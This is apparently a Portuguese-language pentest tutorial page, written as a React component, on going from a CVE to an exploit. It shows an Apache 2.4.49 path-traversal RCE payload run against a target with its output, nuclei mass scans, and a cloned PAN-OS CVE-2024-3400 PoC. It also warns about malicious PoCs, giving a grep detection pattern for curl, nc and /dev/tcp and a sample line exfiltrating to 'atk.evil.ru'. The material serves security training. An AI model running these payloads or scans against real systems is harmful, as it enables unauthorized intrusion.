import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function CVEResearch() {
  return (
    <PageContainer
      title="CVE research — pesquisar e explorar vulns conhecidas"
      subtitle="NVD, MITRE, vulners, nuclei, searchsploit, GitHub PoCs. Da CVE ao exploit em < 10 min."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>O que é uma CVE</h2>
      <p>
        CVE = <strong>Common Vulnerabilities and Exposures</strong>. Identificador único atribuído
        pela MITRE para cada vulnerabilidade pública. Formato: <code>CVE-YYYY-NNNN</code>
        (ex: <code>CVE-2024-3400</code>). É só o ID — a descrição técnica e severidade vêm do
        NVD (NIST), e a prova de conceito vem do EDB / GitHub / blog do pesquisador.
      </p>

      <h2>CVSS — score de severidade</h2>
      <OutputBlock label="CVSS v3.1 (0.0 - 10.0)" type="muted">
{`Score        Categoria       Exemplos
─────        ─────────       ────────
9.0 - 10.0   Critical        RCE não autenticado, root via internet
7.0 - 8.9    High            RCE autenticado, SQLi de admin, escalada
4.0 - 6.9    Medium          XSS stored, IDOR de baixo impacto, info disclosure
0.1 - 3.9    Low             SSL fraco, header faltando, XSS reflected sem cookie
0.0          None            Achado informativo

Fatores (vetor):
  AV:N    Attack Vector: Network        ← internet ≠ Local
  AC:L    Complexity: Low                ← sem condição especial
  PR:N    Privileges Required: None     ← sem login
  UI:N    User Interaction: None        ← vítima não precisa clicar
  S:C     Scope: Changed                ← afeta mais que o componente
  C:H/I:H/A:H   impacto Conf/Integ/Avail Alto`}
      </OutputBlock>

      <h2>Fontes principais</h2>
      <CommandTable
        title="Onde olhar primeiro"
        variations={[
          { cmd: "nvd.nist.gov", desc: "Database oficial. CVSS, CPE, descrição.", output: "Sempre a mais confiável." },
          { cmd: "cve.mitre.org", desc: "Catálogo de IDs (sem detalhes técnicos).", output: "Bom para confirmar existência da CVE." },
          { cmd: "exploit-db.com", desc: "Exploits/PoCs públicos.", output: "Local: searchsploit." },
          { cmd: "github.com/trickest/cve", desc: "Agregador automatizado de PoC GitHub.", output: "Repos por CVE." },
          { cmd: "github (busca por CVE-XXXX)", desc: "PoCs dos pesquisadores.", output: "Cuidado com PoC malicioso." },
          { cmd: "vulners.com", desc: "API de busca cross-source.", output: "Free + API key." },
          { cmd: "cisa.gov/known-exploited-vulnerabilities-catalog", desc: "KEV — vulns ativamente exploradas.", output: "Catálogo CISA: priorizar." },
          { cmd: "nuclei-templates", desc: "Detection automática para 9000+ CVEs.", output: "github.com/projectdiscovery/nuclei-templates" },
        ]}
      />

      <h2>Pipeline: identifiquei serviço, achei a CVE</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) nmap me deu a versão exata",
            cmd: "nmap -sV --script=banner -p 80,443 alvo.com",
            out: `PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http Apache httpd 2.4.49 ((Unix))   ← versão antiga!
| banner: HTTP/1.1 200 OK\\x0d\\x0a\\x0d\\x0a Server: Apache/2.4.49`,
            outType: "warning",
          },
          {
            comment: "2) searchsploit — exploits locais",
            cmd: "searchsploit apache 2.4.49",
            out: `------------------------------------------------------------- ----------------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------- ----------------------------------------
Apache 2.4.49 - Path Traversal & Remote Code Execution      | multiple/webapps/50383.py
Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-42013)      | multiple/webapps/50406.sh
Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773) | multiple/webapps/50438.py`,
            outType: "info",
          },
          {
            comment: "3) NVD — confirmar metadata e CVSS",
            cmd: "curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-41773' | jq -r '.vulnerabilities[0].cve | {id, descriptions: .descriptions[0].value, cvss: .metrics.cvssMetricV31[0].cvssData.baseScore}'",
            out: `{
  "id": "CVE-2021-41773",
  "descriptions": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration 'require all denied', these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.",
  "cvss": 7.5
}`,
            outType: "default",
          },
          {
            comment: "4) ver PoC antes de rodar",
            cmd: "searchsploit -m 50438 && cat 50438.py | head -30",
            out: `Exploit: Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)
Path: /usr/share/exploitdb/exploits/multiple/webapps/50438.py
Copied to: /home/wallyson/50438.py

#!/usr/bin/env python3
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution
# CVE: CVE-2021-41773
# Author: ZephrFish

import requests, sys
url = sys.argv[1]
cmd = sys.argv[2]
payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
[...]`,
            outType: "info",
          },
          {
            comment: "5) executar (lab)",
            cmd: "python3 50438.py http://alvo.com 'id; uname -a'",
            out: `[+] Vulnerable target detected
[+] Sending payload...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux alvo 5.10.0 #1 SMP x86_64 GNU/Linux`,
            outType: "error",
          },
        ]}
      />

      <h2>Nuclei — detecção em massa</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nuclei -version && ls ~/nuclei-templates/cves/2024 | head",
            out: `Nuclei Engine Version: v3.3.0

CVE-2024-0001-rce.yaml
CVE-2024-0008-sqli.yaml
CVE-2024-0204-fortra.yaml
CVE-2024-1212.yaml
CVE-2024-1305.yaml
CVE-2024-21887-ivanti.yaml
CVE-2024-3273-dlink.yaml
CVE-2024-3400-panos.yaml`,
            outType: "info",
          },
          {
            cmd: "nuclei -u https://alvo.com -t cves/ -severity critical,high",
            out: `[INF] Templates loaded: 9421
[INF] Targets loaded: 1

[CVE-2021-41773] [http] [critical] http://alvo.com/cgi-bin/.%2e/%2e%2e/etc/passwd
[CVE-2021-42013] [http] [critical] http://alvo.com/cgi-bin/.%2e/%2e%2e/bin/sh
[wordpress-detect] [http] [info] http://blog.alvo.com WordPress 5.7
[CVE-2023-XXXX] [http] [high] http://blog.alvo.com/wp-content/plugins/[X]`,
            outType: "warning",
          },
          {
            comment: "scan em massa de uma lista de URLs",
            cmd: "subfinder -d alvo.com -silent | httpx -silent | nuclei -t cves/ -severity critical -o cves.txt",
            out: `[INF] 47 templates matched
[CVE-2024-3400] [http] [critical] https://vpn.alvo.com/global-protect/login.esp
[CVE-2023-46604] [tcp] [critical] activemq.alvo.com:61616 [Apache ActiveMQ RCE]`,
            outType: "error",
          },
        ]}
      />

      <h2>Por CVE — busca direta</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "searchsploit --cve CVE-2024-3400",
            out: `--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
--------------------------------------------------------------- ----------------------------------------
PAN-OS 11.x - GlobalProtect Command Injection (CVE-2024-3400) | linux/remote/52000.py
--------------------------------------------------------------- ----------------------------------------`,
            outType: "info",
          },
          {
            cmd: "curl -s 'https://api.github.com/search/repositories?q=CVE-2024-3400+pan-os' | jq -r '.items[0:5] | .[].full_name'",
            out: `Chocapikk/CVE-2024-3400
ihebski/CVE-2024-3400-PAN-OS-RCE
horizon3ai/CVE-2024-3400-poc
kljunowsky/CVE-2024-3400-RCE`,
            outType: "default",
          },
          {
            cmd: "git clone https://github.com/horizon3ai/CVE-2024-3400-poc && cd CVE-2024-3400-poc && cat README.md | head -20",
            out: `Cloning into 'CVE-2024-3400-poc'...
remote: Enumerating objects: 28, done.
Receiving objects: 100% (28/28), 12.42 KiB

# CVE-2024-3400 PoC
PAN-OS GlobalProtect command injection.

Affected versions: PAN-OS 10.2, 11.0, 11.1
Pre-auth RCE via SESSID cookie.

Usage: python3 CVE-2024-3400.py -u <target> -c '<command>'

Example:
  python3 CVE-2024-3400.py -u https://vpn.target.com -c 'id'`,
            outType: "warning",
          },
        ]}
      />

      <h2>Cuidado com PoCs maliciosos</h2>
      <AlertBox type="danger" title="Há PoCs no GitHub que são malware">
        Há vários casos documentados de "PoC CVE-X" no GitHub que na verdade contêm:
        <ul className="m-0">
          <li>Reverse shell para servidor do "pesquisador"</li>
          <li>Roubo de chaves SSH em <code>~/.ssh/</code></li>
          <li>Crypto miner</li>
          <li>Backdoor que persiste no seu Kali</li>
        </ul>
        SEMPRE leia o código antes. Atenção a: <code>curl|bash</code>, <code>base64 -d</code>,
        downloads para <code>/tmp/.x</code>, conexões para domínios estranhos.
      </AlertBox>

      <Terminal
        path="~"
        lines={[
          {
            comment: "checagem antes de rodar PoC clonado do GH",
            cmd: "grep -rE 'curl|wget|nc |bash -i|/dev/tcp|base64|exec|eval|os\\.system' .",
            out: `./exploit.py:14:    os.system(f"curl -s http://atk.evil.ru/{token} > /tmp/.x")  ← MALICIOSO!`,
            outType: "error",
          },
          {
            cmd: "grep -E 'http[s]?://[^\\\"]+' exploit.py | grep -v '127\\|localhost\\|alvo\\|target'",
            out: `http://attacker.example.com/callback     ← suspeito!
http://atk.evil.ru/                       ← MALICIOSO!`,
            outType: "warning",
          },
        ]}
      />

      <h2>Templates customizados (Nuclei)</h2>
      <CodeBlock
        language="yaml"
        title="cve-custom.yaml — quando não tem template pronto"
        code={`id: cve-2024-empresa-x

info:
  name: "Empresa-X RCE via header injection"
  author: wallyson
  severity: critical
  description: |
    Empresa-X 2.4.x permite RCE via header X-Custom-Cmd.
  reference:
    - https://blog.empresa.com/security-advisory-001
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-XXXXX
    cwe-id: CWE-78

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/health"
    headers:
      X-Custom-Cmd: "id"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        regex:
          - "uid=[0-9]+\\\\([a-z]+\\\\)"`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "nuclei -u https://alvo.com -t ./cve-custom.yaml -v",
            out: `[VER] sending GET /api/health  X-Custom-Cmd: id
[cve-2024-empresa-x] [http] [critical] https://alvo.com/api/health [uid=33(www-data)]`,
            outType: "warning",
          },
        ]}
      />

      <h2>Priorização: o que importa primeiro</h2>
      <CommandTable
        title="Da lista de 50 CVEs, quais explorar primeiro"
        variations={[
          { cmd: "1. KEV (CISA) presente?", desc: "Vuln já é exploited in the wild.", output: "cisa.gov/known-exploited-vulnerabilities" },
          { cmd: "2. CVSS >= 9.0?", desc: "Critical = grande impacto se sucesso.", output: "Filter -severity critical no nuclei." },
          { cmd: "3. Não-autenticado?", desc: "PR:N no vetor.", output: "Mais provável funcionar." },
          { cmd: "4. PoC público?", desc: "GH/EDB tem código rodável.", output: "Sem PoC = mais trabalho." },
          { cmd: "5. Versão exata bate?", desc: "nmap -sV deu match preciso.", output: "Apache 2.4.49 ≠ 2.4.50 patched." },
          { cmd: "6. Janela de patch?", desc: "Vuln >12 meses + sem patch = vendor pode ter morrido.", output: "Foco em 2023-2025." },
        ]}
      />

      <PracticeBox
        title="Caça à CVE em alvo legal"
        goal="Praticar pipeline em scanme.nmap.org (alvo público autorizado para scan)."
        steps={[
          "nmap -sV em scanme.nmap.org.",
          "Para cada serviço: searchsploit nome versao.",
          "Confira no NVD (curl) o CVSS de cada vuln encontrada.",
          "Filtra só os Critical/High.",
          "NÃO EXPLORE — só identifique. scanme não tem PoC permitido.",
        ]}
        command={`nmap -sV scanme.nmap.org -oN scan.txt
grep open scan.txt | awk '{print $1, $3, $4, $5}'

# para cada (manualmente)
searchsploit "openssh 6.6"
curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=OpenSSH+6.6' \\
  | jq -r '.vulnerabilities[].cve | {id, score: .metrics.cvssMetricV31[0]?.cvssData.baseScore}' \\
  | head -20`}
        expected={`(exemplo)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp   open  http    Apache httpd 2.4.7
9929/tcp open  nping-echo

(searchsploit)
OpenSSH < 7.4 - 'auth_password' Memory Corruption
{"id":"CVE-2016-10012","score":7.8}
{"id":"CVE-2018-15473","score":5.3}`}
        verify="Você deve ter pelo menos 2 CVEs identificados. NÃO RODE PoC contra scanme — apenas detecte."
      />

      <AlertBox type="info" title="Workflow profissional">
        Em pentest real, quase NUNCA você acha 0-day. Seu valor é:
        (1) <strong>encontrar versões vulneráveis</strong> que o cliente não atualizou,
        (2) <strong>provar exploração</strong> (PoC funcional, screenshots),
        (3) <strong>quantificar impacto</strong> (qual servidor, qual dado, qual user controlado),
        (4) <strong>escrever remediation</strong> concreta (atualizar X, mitigar Y, monitorar Z).
      </AlertBox>
    </PageContainer>
  );
}
